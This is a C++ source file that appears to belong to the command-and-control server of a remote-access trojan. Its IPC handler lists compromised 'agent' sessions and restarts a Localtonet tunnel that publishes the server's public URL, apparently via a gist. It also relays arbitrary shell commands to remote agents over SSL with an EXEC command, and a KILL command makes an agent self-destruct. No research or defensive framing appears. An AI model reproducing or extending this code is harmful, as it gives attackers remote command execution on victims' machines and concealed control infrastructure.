#include "../include/ipc_manager.h"
#include "../include/common_state.h"
#include "../include/ui_manager.h"
#include "../include/tunnel_manager.h"
#include "../../common/protocol.h"
#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include <mutex>

#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#endif

// Global mutex to protect std::cout from concurrent writes
std::mutex g_cout_mutex;

void IPCServerThread() {
    int server_fd, new_socket;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, (const char*)&opt, sizeof(opt));

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(INTERNAL_IPC_PORT);

    if (bind(server_fd, (struct sockaddr*)&address, sizeof(address)) < 0) return;
    listen(server_fd, 3);

    while (c2_running) {
        new_socket = accept(server_fd, (sockaddr*)&address, (int*)&addrlen);
        if (new_socket < 0) continue;

        std::string request;
        char buffer[32768];
        int valread;
        while ((valread = recv(new_socket, buffer, sizeof(buffer), 0)) > 0) {
            request.append(buffer, valread);
        }

        if (!request.empty()) {
            std::string response = "ERR";

            if (request == "LIST") {
                std::lock_guard<std::mutex> lock(session_mutex);
                std::ostringstream oss;
                for (auto const& [id, s] : active_sessions) {
                    oss << id << "|" << s.ip << "|" << s.status << "|" << s.last_seen << "\n";
                }
                response = oss.str();
                if (response.empty()) response = "EMPTY";
            }
            else if (request == "STATUS") {
                // Returns: url|port|gist_status
                response = global_public_url + "|" + std::to_string(SERVER_PORT) + "|" + (global_gist_success ? "OK" : "FAIL");
            }
            else if (request == "T_STATUS") {
                response = global_public_url + "|" + (IsProcessRunning(LOCALTONET_EXE) ? "Running" : "Stopped");
            }
            else if (request == "T_FULL_LOG") {
                response = GetDetailedTunnelLogs();
            }
            else if (request == "T_RESTART") {
                CleanupSystem();
                std::string dummy;
                StartTunnelAndGetUrl(SERVER_PORT, dummy);
                response = "RESTARTED|" + global_public_url;
            }
            else if (request.substr(0, 5) == "KILL ") {
                int id = std::stoi(request.substr(5));
                std::lock_guard<std::mutex> lock(session_mutex);
                if (active_sessions.count(id)) {
                    // Send :kill signal
                    bool sent = SendSecureMessage(active_sessions[id].ssl, ":kill");
                    std::string output;
                    
                    // Try to receive final acknowledgment, but don't hang if agent dies instantly
                    if (sent) {
                        ReceiveSecureMessage(active_sessions[id].ssl, output);
                    }
                    
                    SSL_free(active_sessions[id].ssl);
                    active_sessions.erase(id);
                    
                    if (sent) {
                        response = "KILLED|" + (output.empty() ? "Agent self-destructed successfully." : output);
                    } else {
                        response = "KILLED|Agent connection lost (likely self-destructed).";
                    }
                } else {
                    response = "ERR_ID";
                }
            }

            else if (request.substr(0, 5) == "EXEC ") {
                size_t space = request.find(' ', 5);
                if (space != std::string::npos) {
                    int id = std::stoi(request.substr(5, space - 5));
                    std::string cmd = request.substr(space + 1);
                    
                    std::lock_guard<std::mutex> lock(session_mutex);
                    if (active_sessions.count(id)) {
                        if (SendSecureMessage(active_sessions[id].ssl, cmd)) {
                            std::string output, cwd;
                            if (ReceiveSecureMessage(active_sessions[id].ssl, output) && ReceiveSecureMessage(active_sessions[id].ssl, cwd)) {
                                response = output + "|||" + cwd;
                                if (cwd == "TERMINATED") {
                                    SSL_free(active_sessions[id].ssl);
                                    active_sessions.erase(id);
                                }
                            } else {
                                SSL_free(active_sessions[id].ssl);
                                active_sessions.erase(id);
                                response = "ERR_RECV";
                            }
                        } else {
                            SSL_free(active_sessions[id].ssl);
                            active_sessions.erase(id);
                            response = "ERR_SEND";
                        }
                    } else {
                        response = "ERR_ID";
                    }
                }
            }
            else if (request == "SHUTDOWN") {
                c2_running = false;
                response = "OK";
            }
            // Other commands...
            send(new_socket, response.c_str(), response.length(), 0);
        }
        closesocket(new_socket);
        if (!c2_running) break;
    }
    closesocket(server_fd);
}

std::string SendIPCRequest(const std::string& request) {
    int sock = 0;
    struct sockaddr_in serv_addr;

    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) return "ERR_SOCK";

#ifdef _WIN32
    DWORD timeout = 120000; // 120 seconds timeout (Professional grade for heavy scans)
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
#else
    struct timeval tv;
    tv.tv_sec = 20;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));
#endif

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(INTERNAL_IPC_PORT);
    inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr);

    if (connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
        closesocket(sock);
        return "ERR_CONN";
    }

    // --- ROBUST IPC TRANSMISSION (CHUNK-BASED) ---
    size_t total_sent = 0;
    size_t to_send = request.length();
    while (total_sent < to_send) {
        int bytes_sent = send(sock, request.c_str() + total_sent, to_send - total_sent, 0);
        if (bytes_sent <= 0) break;
        total_sent += bytes_sent;
    }
    
    // Shutdown sending part so server knows we are done
    shutdown(sock, SD_SEND);

    std::string res;
    char buffer[4096];
    int valread;
    
    while ((valread = recv(sock, buffer, sizeof(buffer), 0)) > 0) {
        res.append(buffer, valread);
    }
    
    closesocket(sock);
    return res.empty() ? "ERR_READ" : res;
}
